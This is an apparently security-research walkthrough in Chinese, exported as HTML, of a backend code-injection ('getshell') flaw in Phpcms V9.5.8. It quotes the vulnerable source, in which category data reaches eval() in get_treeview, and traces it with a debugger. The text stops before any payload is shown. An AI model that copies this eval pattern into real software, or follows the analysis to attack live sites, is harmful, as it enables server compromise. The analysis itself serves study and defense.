<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="phpcms-v958-后台getshell"><span class="csDE05BCC">Phpcms V9.5.8 </span><span class="csECDA2D3">后台</span><span class="csDE05BCC">getshell</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Phpcms V9.5.8</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">代码位于</span><span class="cs9FB05234">/phpcms/modules/content/content.php</span><span class="cs8926E06"> </span><span class="cs9C1B1871">第</span><span class="cs8926E06">472-532</span><span class="cs9C1B1871">行</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function public_categorys() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$show_header = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$cfg = getcache(&#39;common&#39;,&#39;commons&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ajax_show = intval($cfg[&#39;category_ajax&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$from = isset($_GET[&#39;from&#39;]) &amp;&amp; in_array($_GET[&#39;from&#39;],array(&#39;block&#39;)) ? $_GET[&#39;from&#39;] : &#39;content&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$tree = pc_base::load_sys_class(&#39;tree&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($from==&#39;content&#39; &amp;&amp; $_SESSION[&#39;roleid&#39;] != 1) { </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;priv_db = pc_base::load_model(&#39;category_priv_model&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$priv_result = $this-&gt;priv_db-&gt;select(array(&#39;action&#39;=&gt;&#39;init&#39;,&#39;roleid&#39;=&gt;$_SESSION[&#39;roleid&#39;],&#39;siteid&#39;=&gt;$this-&gt;siteid,&#39;is_admin&#39;=&gt;1));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$priv_catids = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($priv_result as $_v) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$priv_catids[] = $_v[&#39;catid&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(empty($priv_catids)) return &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$categorys = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(!empty($this-&gt;categorys)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($this-&gt;categorys as $r) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($r[&#39;siteid&#39;]!=$this-&gt;siteid || &nbsp;($r[&#39;type&#39;]==2 &amp;&amp; $r[&#39;child&#39;]==0)) continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($from==&#39;content&#39; &amp;&amp; $_SESSION[&#39;roleid&#39;] != 1 &amp;&amp; !in_array($r[&#39;catid&#39;],$priv_catids)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arrchildid = explode(&#39;,&#39;,$r[&#39;arrchildid&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$array_intersect = array_intersect($priv_catids,$arrchildid);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(empty($array_intersect)) continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($r[&#39;type&#39;]==1 || $from==&#39;block&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($r[&#39;type&#39;]==0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$r[&#39;vs_show&#39;] = &quot;&lt;a href=&#39;?m=block&amp;c=block_admin&amp;a=public_visualization&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=&quot;.$r[&#39;catid&#39;].&quot;&amp;type=show&#39; target=&#39;right&#39;&gt;[&quot;.L(&#39;content_page&#39;).&quot;]&lt;/a&gt;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$r[&#39;vs_show&#39;] =&#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$r[&#39;icon_type&#39;] = &#39;file&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$r[&#39;add_icon&#39;] = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$r[&#39;type&#39;] = &#39;add&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$r[&#39;icon_type&#39;] = $r[&#39;vs_show&#39;] = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$r[&#39;type&#39;] = &#39;init&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$r[&#39;add_icon&#39;] = &quot;&lt;a target=&#39;right&#39; href=&#39;?m=content&amp;c=content&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=&quot;.$r[&#39;catid&#39;].&quot;&#39; onclick=javascript:openwinx(&#39;?m=content&amp;c=content&amp;a=add&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=&quot;.$r[&#39;catid&#39;].&quot;&amp;hash_page=&quot;.$_SESSION[&#39;hash_page&#39;].&quot;&#39;,&#39;&#39;)&gt;&lt;img src=&#39;&quot;.IMG_PATH.&quot;add_content.gif&#39; alt=&#39;&quot;.L(&#39;add&#39;).&quot;&#39;&gt;&lt;/a&gt; &quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$categorys[$r[&#39;catid&#39;]] = $r;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(!empty($categorys)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tree-&gt;init($categorys);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch($from) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case &#39;block&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$strs = &quot;&lt;span class=&#39;\$icon_type&#39;&gt;\$add_icon&lt;a href=&#39;?m=block&amp;c=block_admin&amp;a=public_visualization&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=\$catid&amp;type=list&#39; target=&#39;right&#39;&gt;\$catname&lt;/a&gt; \$vs_show&lt;/span&gt;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$strs2 = &quot;&lt;img src=&#39;&quot;.IMG_PATH.&quot;folder.gif&#39;&gt; &lt;a href=&#39;?m=block&amp;c=block_admin&amp;a=public_visualization&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=\$catid&amp;type=category&#39; target=&#39;right&#39;&gt;\$catname&lt;/a&gt;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$strs = &quot;&lt;span class=&#39;\$icon_type&#39;&gt;\$add_icon&lt;a href=&#39;?m=content&amp;c=content&amp;a=\$type&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=\$catid&#39; target=&#39;right&#39; onclick=&#39;open_list(this)&#39;&gt;\$catname&lt;/a&gt;&lt;/span&gt;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$strs2 = &quot;&lt;span class=&#39;folder&#39;&gt;\$catname&lt;/span&gt;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$categorys = $tree-&gt;get_treeview(0,&#39;category_tree&#39;,$strs,$strs2,$ajax_show);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$categorys = L(&#39;please_add_category&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;include $this-&gt;admin_tpl(&#39;category_tree&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">复制</span><span class="cs8926E06"> </span><span class="cs9C1B1871">文本</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在当前函数开始下个断点</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20V9.5.8%20%e5%90%8e%e5%8f%b0getshell_files/image0.png" width="560" height="214" alt="" style="border-width:0px;" /></span><span><img src="Web安全/Phpcms/Phpcms%20V9.5.8%20%e5%90%8e%e5%8f%b0getshell_files/image1.png" width="560" height="214" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟到</span><span class="cs8926E06">526</span><span class="cs9C1B1871">行：</span></p><p class="cs3A447A38"><span class="cs9FB05234">$categorys = $tree-&gt;get_treeview(0,&#39;category_tree&#39;,$strs,$strs2,$ajax_show);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">复制</span><span class="cs8926E06"> </span><span class="cs9C1B1871">文本</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">进入了</span><span class="cs9FB05234">get_treeview()</span><span class="cs9C1B1871">函数，跟入进去，</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">函数位于</span><span class="cs8926E06"> </span><span class="cs9FB05234">/phpcms/libs/classes/tree.class.php</span><span class="cs8926E06"> </span><span class="cs9C1B1871">第</span><span class="cs8926E06">206-239</span><span class="cs9C1B1871">行。</span></p><p class="cs3A447A38"><span class="cs9FB05234">* @param $myid </span><span class="cs7FFD2630">表示获得这个</span><span class="cs9FB05234">ID</span><span class="cs7FFD2630">下的所有子级</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">* @param $effected_id </span><span class="cs7FFD2630">需要生成</span><span class="cs9FB05234">treeview</span><span class="cs7FFD2630">目录数的</span><span class="cs9FB05234">id</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">* @param $str </span><span class="cs7FFD2630">末级样式</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">* @param $str2 </span><span class="cs7FFD2630">目录级别样式</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">* @param $showlevel </span><span class="cs7FFD2630">直接显示层级数，其余为异步显示，</span><span class="cs9FB05234">0</span><span class="cs7FFD2630">为全部限制</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">* @param $style </span><span class="cs7FFD2630">目录样式</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">默认</span><span class="cs9FB05234"> filetree </span><span class="cs7FFD2630">可增加其他样式如</span><span class="cs9FB05234">&#39;filetree treeview-famfamfam&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">* @param $currentlevel </span><span class="cs7FFD2630">计算当前层级，递归使用</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">适用改函数时不需要用该参数</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">* @param $recursion </span><span class="cs7FFD2630">递归使用</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">外部调用时为</span><span class="cs9FB05234">FALSE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function get_treeview($myid,$effected_id=&#39;example&#39;,$str=&quot;&lt;span class=&#39;file&#39;&gt;\$name&lt;/span&gt;&quot;, $str2=&quot;&lt;span class=&#39;folder&#39;&gt;\$name&lt;/span&gt;&quot; ,$showlevel = 0 ,$style=&#39;filetree &#39; , $currentlevel = 1,$recursion=FALSE) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;$child = $this-&gt;get_child($myid);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;if(!defined(&#39;EFFECTED_INIT&#39;)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$effected = &#39; id=&quot;&#39;.$effected_id.&#39;&quot;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;define(&#39;EFFECTED_INIT&#39;, 1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$effected = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;$placeholder = &nbsp;&#39;&lt;ul&gt;&lt;li&gt;&lt;span class=&quot;placeholder&quot;&gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;if(!$recursion) $this-&gt;str .=&#39;&lt;ul&#39;.$effected.&#39; &nbsp;class=&quot;&#39;.$style.&#39;&quot;&gt;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;foreach($child as $id=&gt;$a) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@extract($a);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($showlevel &gt; 0 &amp;&amp; $showlevel == $currentlevel &amp;&amp; $this-&gt;get_child($id)) $folder = &#39;hasChildren&#39;; //</span><span class="cs7FFD2630">如设置显示层级模式</span><span class="cs9FB05234">@2011.07.01</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$floder_status = isset($folder) ? &#39; class=&quot;&#39;.$folder.&#39;&quot;&#39; : &#39;&#39;; &nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;str .= $recursion ? &#39;&lt;ul&gt;&lt;li&#39;.$floder_status.&#39; id=\&#39;&#39;.$id.&#39;\&#39;&gt;&#39; : &#39;&lt;li&#39;.$floder_status.&#39; id=\&#39;&#39;.$id.&#39;\&#39;&gt;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$recursion = FALSE;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($this-&gt;get_child($id)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eval(&quot;\$nstr = \&quot;$str2\&quot;;&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;str .= $nstr;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($showlevel == 0 || ($showlevel &gt; 0 &amp;&amp; $showlevel &gt; $currentlevel)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;get_treeview($id, $effected_id, $str, $str2, $showlevel, $style, $currentlevel+1, TRUE);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} elseif($showlevel &gt; 0 &amp;&amp; $showlevel == $currentlevel) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;str .= $placeholder;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eval(&quot;\$nstr = \&quot;$str\&quot;;&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;str .= $nstr;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;str .=$recursion ? &#39;&lt;/li&gt;&lt;/ul&gt;&#39;: &#39;&lt;/li&gt;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;if(!$recursion) &nbsp;$this-&gt;str .=&#39;&lt;/ul&gt;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;return $this-&gt;str;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> }</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">复制</span><span class="cs8926E06"> </span><span class="cs9C1B1871">文本</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里有个判断：</span></p><p class="cs3A447A38"><span class="cs9FB05234">if($this-&gt;get_child($id))</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20V9.5.8%20%e5%90%8e%e5%8f%b0getshell_files/image2.png" width="560" height="221" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当第一次执行为</span><span class="cs8926E06">ture</span><span class="cs9C1B1871">的时候，还是会再次执行</span><span class="cs9FB05234">get_treeview</span><span class="cs9C1B1871">的内容</span></p><p class="cs3A447A38"><span class="cs9FB05234">$this-&gt;get_treeview($id, $effected_id, $str, 